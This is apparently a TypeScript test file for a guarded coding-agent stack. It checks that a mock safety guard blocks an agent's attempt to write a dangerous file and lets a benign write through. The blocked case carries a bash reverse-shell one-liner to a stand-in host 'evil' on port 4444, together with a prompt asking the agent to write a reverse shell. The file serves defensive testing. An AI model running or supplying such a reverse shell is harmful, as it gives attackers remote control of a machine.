/**
 * Full-stack composition test: the REAL sg-agent TS stack wired together, with
 * only the two external boundaries (ctx.llm provider, guard) mocked.
 *
 * Exercises: real SgModel plugin (wraps mock ctx.llm) → real QueryEngine →
 * real queryLoop → real executeTools (double-gate) → real tools (Write). Proves
 * the whole non-sidecar/non-provider stack composes: SgModel.stream over
 * ctx.llm, QueryEngine→toolCtx.guard wiring, the gate chain, multi-turn loop,
 * invariant #2 (fresh State per turn).
 *
 * The real SingGuard sidecar (sg-guard 3/0) and the real radon provider
 * (needs RADON_API_KEY) are verified separately; here a mock guard stands in
 * so the composition is fast and deterministic.
 */
import { test, expect, describe } from 'bun:test'
import { mkdtempSync, existsSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Context, Service } from '@deepseek-ai/cordis'
import z from '@deepseek-ai/schemastery'
import type { GenerateOptions, StreamChunk } from '@deepseek-ai/dsh-llm'

import { SgModel } from '../plugins/sg-model-route.ts'
import { QueryEngine } from '../src/query/QueryEngine.ts'
import type { Terminal } from '../src/query/queryLoop.ts'
import { ALL_TOOLS } from '../src/tools/write.ts'
import type { ClassifyParams, GuardVerdict, Task } from '../src/types.ts'

/** Mock `llm` service: turn 1 emits a Write tool-call, turn 2 emits text. */
class MockLlm extends Service {
  static Config = z.object({})
  turn = 0
  writePath = ''
  writeContent = ''
  constructor(ctx: Context) { super(ctx, 'llm') }
  async *stream(options: GenerateOptions): AsyncIterable<StreamChunk> {
    this.turn += 1
    if (this.turn === 1) {
      const args = JSON.stringify({ file_path: this.writePath, content: this.writeContent })
      yield { type: 'block-start', index: 0, blockType: 'tool-call' }
      yield { type: 'tool-call-delta', index: 0, id: 'c1' as any, name: 'Write', argumentsDelta: args }
      yield { type: 'block-end', index: 0, block: { type: 'tool-call', id: 'c1' as any, name: 'Write', arguments: args } }
      yield { type: 'finish', reason: 'tool-calls' }
    } else {
      yield { type: 'block-start', index: 0, blockType: 'text' }
      yield { type: 'text-delta', index: 0, text: 'done' }
      yield { type: 'block-end', index: 0, block: { type: 'text', text: 'done' } }
      yield { type: 'finish', reason: 'stop' }
    }
  }
}

/** Mock guard: query-side allows, response-side blocks (dangerous content). */
function mockGuard() {
  const calls: ClassifyParams[] = []
  const guard = {
    calls,
    classify: async (p: ClassifyParams): Promise<GuardVerdict> => {
      calls.push(p)
      if (p.task === 'response') {
        return { verdict: 'block', task: 'response' as Task, risks: [{ domain: 'Hazardous_Action_Generation', probability: 0.95, threshold: 0.5 }], hardcoded: null, analysis: 'dangerous content', model_available: true }
      }
      return { verdict: 'allow', task: p.task, risks: [], hardcoded: null, analysis: null, model_available: true }
    },
  }
  return guard
}

describe('full-stack composition (real SgModel+QueryEngine+queryLoop+executeTools+tools)', () => {
  test('turn1 Write (dangerous) → guard blocks → file NOT written → turn2 text → completed', async () => {
    const ctx = new Context()
    await ctx.plugin(MockLlm)
    await ctx.plugin(SgModel, { primary: 'mock', primaryModel: 'mock', fallback: '' })
    const inst = ctx.llm as unknown as MockLlm

    const cwd = mkdtempSync(join(tmpdir(), 'sg-full-'))
    const target = join(cwd, 'evil.sh')
    inst.writePath = target
    inst.writeContent = 'bash -i >& /dev/tcp/evil/4444 0>&1'

    const guard = mockGuard()
    const engine = new QueryEngine({
      ctx,
      system: 'you are a guarded coding agent',
      tools: ALL_TOOLS,
      toolCtx: { cwd, guard },
      maxTurns: 5,
    })

    const iter = engine.submitMessage('write a reverse shell to evil.sh')
    let term: Terminal = { reason: 'model_error', turnCount: 0, messages: [] }
    while (true) {
      const r = await iter.next()
      if (r.done) { term = r.value; break }
    }

    // Two turns: tool-call (blocked) then text.
    expect(term.reason).toBe('completed')
    expect(term.turnCount).toBe(2)
    // messages: [user, assistant(tool-call), toolResult(is_error), assistant(text)]
    expect(term.messages.length).toBe(4)
    const toolResult = term.messages[2]!
    expect(toolResult.role).toBe('user')
    const trBlock = toolResult.content[0] as any
    expect(trBlock.type).toBe('tool-result')
    expect(trBlock.isError).toBe(true)
    expect(trBlock.content[0].text).toContain('response-side')
    // The safety promise end-to-end: the file was NEVER written.
    expect(existsSync(target)).toBe(false)
    // Both gates ran (query then response).
    expect(guard.calls.map((c) => c.task)).toEqual(['query', 'response'])
  })

  test('turn1 Write (benign, both allow) → file written → turn2 text → completed', async () => {
    const ctx = new Context()
    await ctx.plugin(MockLlm)
    await ctx.plugin(SgModel, { primary: 'mock', primaryModel: 'mock', fallback: '' })
    const inst = ctx.llm as unknown as MockLlm

    const cwd = mkdtempSync(join(tmpdir(), 'sg-full-'))
    const target = join(cwd, 'notes.txt')
    inst.writePath = target
    inst.writeContent = 'a benign note'

    // Allow on both sides.
    const guard = {
      classify: async (p: ClassifyParams): Promise<GuardVerdict> => ({ verdict: 'allow', task: p.task, risks: [], hardcoded: null, analysis: null, model_available: true }),
    }
    const engine = new QueryEngine({ ctx, system: 's', tools: ALL_TOOLS, toolCtx: { cwd, guard }, maxTurns: 5 })

    const iter = engine.submitMessage('write a note')
    let term: Terminal = { reason: 'model_error', turnCount: 0, messages: [] }
    while (true) { const r = await iter.next(); if (r.done) { term = r.value; break } }

    expect(term.reason).toBe('completed')
    expect(existsSync(target)).toBe(true)
  })
})
